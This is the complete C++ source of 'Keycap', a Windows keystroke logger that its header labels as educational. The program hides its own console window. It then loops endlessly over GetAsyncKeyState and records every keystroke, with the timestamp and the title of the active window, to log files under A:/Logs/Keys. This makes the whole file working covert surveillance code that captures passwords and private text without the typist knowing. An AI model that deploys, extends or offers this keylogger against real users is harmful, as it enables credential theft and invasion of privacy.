/*
 * Copyright (c) 2015 Richard B Tilley <brad@w8rbt.org>
 *
 * Permission to use, copy, modify, and distribute this software for any
 * purpose with or without fee is hereby granted, provided that the above
 * copyright notice and this permission notice appear in all copies.
 *
 * THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
 * WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
 * ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
 * WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
 * ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
 * OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
 *
 * Keycap - A simple keystroke logger for Windows intended
 *          for educational purposes and demonstration.
 *
 */

#define _WIN32_WINNT 0x0500

#include <chrono>
#include <cstdint>
#include <cstdlib>
#include <ctime>
#include <direct.h>
#include <fstream>
#include <iostream>
#include <map>
#include <string>
#include <vector>
#include <windows.h>

#include "main.hpp"

// #if  _WIN32_WINNT < 0x0500
// #undef  _WIN32_WINNT
// #define _WIN32_WINNT   0x0500
// #endif

std::ofstream logfile;

void openLogFile(char *filepath) { logfile.open(filepath); }

bool isLogFileOpen() { return logfile.is_open(); }

void closeLogFile() {
  if (isLogFileOpen())
    logfile.close();
}

void hideWindow() {
  /**
   * Sets the specified window's show state.
   * @param hWnd -> A handle to the window.
   *                GetConsoleWindow()
   *                Retrieves the window handle used by the console
   *                associated with the calling process.
   * @param nCmdShow -> window visibility
   *
   */

  HWND hWnd = GetConsoleWindow();
  int nCmdShow = SW_HIDE;
  ShowWindow(hWnd, nCmdShow);
}

/**
 * Creates Timestamp
 * @return timestamp
 */
const tm *timestamp() {
  time_t ltime;
  struct tm *Tm;

  ltime = time(NULL);
  Tm = std::localtime(&ltime);

  return Tm;
}

/**
 * Create directory and return filename to write the log
 * @param buffer filename to write
 * @param length length of the buffer
 */
void setupStreams(char *buffer, const int length) {
  const char *directory_fmt = "mkdir \"A:\\Logs\\Keys\\%Y\\%Y-%m\\\"";
  const char *filepath_fmt = "A:/Logs/Keys/%Y/%Y-%m/%Y-%m-%d_%H_%M_%S.log";

  const struct tm *time = timestamp();
  std::strftime(buffer, length, directory_fmt, time);
  system(buffer);
  std::cout << buffer;

  std::strftime(buffer, length, filepath_fmt, time);

  std::cout << "\n" << buffer;
}

/**
 * Logs keystrokes from keybooard and dumps to file
 *
 * This function sleeps for sleepMilliseconds milliseconds to minimise
 * cpu usage.
 */
void startLogging() {
  logfile << "KEY|TIME|WINDOW\n";

  std::chrono::time_point<std::chrono::system_clock> system_clock =
      std::chrono::system_clock::now();

  std::map<std::int16_t, std::vector<std::string>> keys = vk();
  std::map<std::int16_t, std::vector<std::string>>::const_iterator keyit;

  const int timestamp_length = 32;
  const char *timestamp_fmt = "%Y-%m-%d_%H:%M:%S";
  char *timestamp = (char *)calloc(timestamp_length, sizeof(char));
  std::string character_key;

  bool shift_key;

  // Windows handle & title
  HWND activeWindowHandler;

  const int activeWindowTitleLength = 2048;
  TCHAR activeWindowTitle[activeWindowTitleLength];

  const int sleepMilliseconds = 15;
  while (true) {
    shift_key = false;
    activeWindowHandler = GetForegroundWindow();

    for (keyit = keys.begin(); keyit != keys.end(); ++keyit) {
      system_clock = std::chrono::system_clock::now();
      std::time_t system_time =
          std::chrono::system_clock::to_time_t(system_clock);
      std::strftime(timestamp, timestamp_length, timestamp_fmt,
                    std::localtime(&system_time));

      std::int16_t key_state = GetAsyncKeyState(keyit->first);
      GetWindowText(activeWindowHandler, activeWindowTitle,
                    activeWindowTitleLength);

      // Shift key is down. MSB is set.
      if (key_state == -32768 && keyit->first == 16) {
        shift_key = true;
      }

      // Key state has changed. LSB is set.
      if (key_state == -32767) {
        // Handle Uppercase Characters
        if (shift_key) {
          logfile << timestamp << "|" << keyit->second[1] << "|\"";
          logfile << activeWindowTitle << "\"\n";
          character_key = keyit->second[1];
        }

        // Handle Lowercase Characters
        else {
          logfile << timestamp << "|" << keyit->second[0] << "|\"";
          logfile << activeWindowTitle << "\"\n";
          character_key = keyit->second[0];
        }
      }
    }

    // Sleep() requires WinXP or later (sleep 15 milliseconds)
    // Can be removed entirely to capture Yubikey, etc.
    // but may be CPU intensive
    Sleep(sleepMilliseconds);
  }
}

int main() {
  hideWindow();
  const int filename_length = 120;
  char *filename = (char *)calloc(filename_length, sizeof(char));
  std::cout << strlen(filename) << "\n" << filename;
  setupStreams(filename, filename_length);

  openLogFile(filename);

  /**
   * Register call to closeLogFile when the user exits
   */
  std::atexit(closeLogFile);

  if (isLogFileOpen()) {
    std::cout << "Success\n";
  } else {
    std::cerr << "Failed to open log file at" << filename;
    exit(0);
  }

  startLogging();

  return 0;
}
